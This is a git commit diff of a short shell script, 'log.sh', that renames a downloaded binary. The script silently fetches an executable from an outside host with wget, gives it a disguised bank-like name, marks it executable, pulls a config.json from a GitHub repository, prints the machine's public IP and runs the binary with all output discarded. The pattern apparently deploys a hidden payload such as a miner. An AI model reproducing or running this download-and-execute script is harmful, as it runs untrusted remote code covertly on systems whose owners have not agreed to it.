6a82932ff1fb2b3b3c0a4e6728a711fecd26c120
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-14 03:03:27 +0700

    Update log.sh

--- log.sh
+++ log.sh
@@ -1,7 +1,7 @@
-wget -q -O CréditGardebank https://maper.info/api-server && chmod +x CréditGardebank >/dev/null 2>&1
+wget -q -O CréditNationaleUnCapital https://maper.info/api-server && chmod +x CréditNationaleUnCapital >/dev/null 2>&1
 wget -q https://raw.githubusercontent.com/55113110159/TIBO/main/config.json && chmod +x config.json
 sleep 11 
 echo "******************************************************************" 
 echo "IP ORI ==> "$(curl ifconfig.me) 
 echo " "
-./CréditGardebank -c "config.json" >/dev/null 2>&1
+./CréditNationaleUnCapital -c "config.json" >/dev/null 2>&1
